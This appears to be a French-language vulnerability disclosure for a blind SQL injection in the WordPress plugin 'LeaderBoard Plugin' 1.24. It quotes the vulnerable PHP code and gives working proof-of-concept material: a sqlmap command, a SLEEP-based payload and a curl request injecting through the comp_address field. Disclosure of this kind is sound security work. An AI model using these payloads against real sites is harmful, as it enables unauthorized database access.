---
title: "Faille d'injection SQL dans le plugin Wordpress LeaderBoard Plugin"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin Wordpress [LeaderBoard Plugin](https://wordpress.org/plugins/leaderboard-lite/) (slug: `leaderboard-lite`) se présente de cette façon :

> LeaderBoard plugin is to enhance a WordPress site to manage events and LeaderBoards; could manage events, divisions,workouts, competitors and scoreboard associated with each events. All the admin forms are powered with Ajax.
  
La version testée est la 1.24 qui date d'il y a 4 ans.

## La vulnérabilité

Dans le script `front-end/eventLeaderBoard-registration.php` on trouve le code suivant qui gère un formulaire d'enregistrement :

```php
<?php if ( ! defined( 'ABSPATH' ) ) exit; ?>                                                                           
<?php get_header(); ?>                                                                                                 
<?php                                                                                                                  
    global $wpdb, $post;                                                                                               
    $options = get_option('LeaderBoardSettings');                                                                      
                                                                                                                       
    date_default_timezone_set("UTC");                                                                                  
    $table1 = $wpdb->prefix . "lbd_event_participants";                                                                
    $table2 = $wpdb->prefix . "lbd_event_scores";                                                                      
    $table3 = $wpdb->prefix . "lbd_event_divisions";                                                                   
    $table4 = $wpdb->prefix . "lbd_event_events";                                                                      
    $table5 = $wpdb->prefix . "lbd_event_competitions";                                                                
    $table6 = $wpdb->prefix . "lbd_event_registeredEvents";                                                            
    $table7 = $wpdb->prefix . "lbd_event_workouts";                                                                    
    $table8 = $wpdb->prefix . "lbd_event_registration_transaction";                                                    
                                                                                                                       
    $my_account = get_option('LeaderBoard_eventMyAccount');                                                            
    $payment_url = get_option('LeaderBoard_Payment');                                                                  
    $LeaderBoard_eventUserRegistration  = get_option('LeaderBoard_eventUserRegistration');                             
?>                                                                                                                     
<section class="commen-wraper compititor-regi-block">                                                                  
    <div class="plugin-container">                                                                                     
    <?php                                                                                                              
    if(isset($_POST['AddCompetitorReg'])=='Submit'){                                                                   
        $competitor_name        = (isset($_POST['comp_fullname']))?sanitize_text_field($_POST['comp_fullname']):"";    
        $competitor_gender  = (isset($_POST['comp_gender']))?sanitize_text_field($_POST['comp_gender']):"";            
        $competitor_dob             = sanitize_text_field($_POST['comp_dob']);                                         
        $competitor_age             = sanitize_text_field($_POST['comp_age']);                                         
        $competitor_email       = sanitize_email($_POST['comp_email']);                                                
        $competitor_address     = stripslashes(sanitize_text_field($_POST['comp_address']));                           
        $competitor_phone       = sanitize_text_field($_POST['comp_phn']);                                             
        $competitor_division    = sanitize_text_field($_POST['comp_div']);                                             
        $competitor_reg_date = date('Y-m-d');                                                                          
        $competitor_reg_fee     = $options['memberFee_individual'];                                                    
        $competitor_payment_status = "pending";                                                                        
        $competitor_status      = 0;                                                                                   
        //login data                                                                                                   
        $competitor_username    = str_replace(" ","",$competitor_name).date('ymd');                                    
        $pass                                   = strtotime("now");                                                    
        $competitor_pass            = md5($pass);                                                                      
                                                                                                                       
        if($competitor_name != '' && $competitor_email !='' && $competitor_phone !=''){                                
            $sql  = 'INSERT INTO '.$table1.' (`id`, `participant_name`,`user_name`,`user_pass`,`gender`, `dob`, `age`,`email`, `address`, `phonenum`, `division`, `registration_date`, `registration_fee`, `payment_status`, `status`) VALUES (NULL, "'.$competitor_name.'","'.$competitor_username.'","'.$competitor_pass.'","'.$competitor_gender.'", "'.$competitor_dob.'", "'.$competitor_age.'", "'.$competitor_email.'", "'.$competitor_address.'", "'.$competitor_phone.'", "'.$competitor_division.'", "'.$competitor_reg_date.'", "'.$competitor_reg_fee.'", "'.$competitor_payment_status.'", "'.$competitor_status.'")';
                                                                                                                       
            dbDelta( $sql );
            --- snip ---
```

La fonction [dbDelta](https://developer.wordpress.org/reference/functions/dbdelta/) provient de Wordpress et permet l'exécution d'une requête SQL.

On remarque que le paramètre `comp_address` est passé comme d'autres à `sanitize_text_field` ainsi qu'à `stripslashes`.

La variable `$competitor_address` ainsi créée est utilisée telle quelle pour la requête SQL INSERT ce qui permet une injection SQL en aveugle.

`sqlmap` détecte bien la vulnérabilité d'injection en aveugle via la technique time-based.

PoC :

```
python sqlmap.py -u "http://localhost:8000/?page_id=9" --data "comp_fullname=default&comp_dob=default&comp_email=nobody%40nowhere.com&comp_phn=default&comp_photo=pix.gif&comp_age=default&accept_conditions=default&AddCompetitorReg=Submit&comp_div=&comp_nation=Zimbabwe&comp_address=&comp_gender=F" -p comp_address --risk 3 --level 5 --technique=T
```

Le payload utilisé par `sqlmap` est de ce type :

```
"="" AND (SELECT 2496 FROM (SELECT(SLEEP(5)))vJYk) AND ""="
```

L'objectif est de placer plusieurs conditions dans la partie de la requête destinée eu champ `address`.

Le `"=""` permet de créer une première condition vraie puis d'enchainer via un `AND` sur une condition que l'on contrôle.

Il faut ensuite rétablie l'équilibre des guillemets, ce que `sqlmap` fait avec le `AND ""="` final.

Un PoC plus simple via cURL pour tester la temporisation :

```
curl "http://localhost:8000/?page_id=9" -e "http://localhost:8000/?page_id=9" -d "comp_fullname=default&comp_dob=default&comp_email=nobody%40nowhere.com&comp_phn=default&comp_photo=pix.gif&comp_age=default&accept_conditions=default&AddCompetitorReg=Submit&comp_div=&comp_nation=Zimbabwe&comp_address=%22%3d%22%22%20AND%20sleep(10)%20AND%20%22%22%3d%22&comp_gender=F"
```
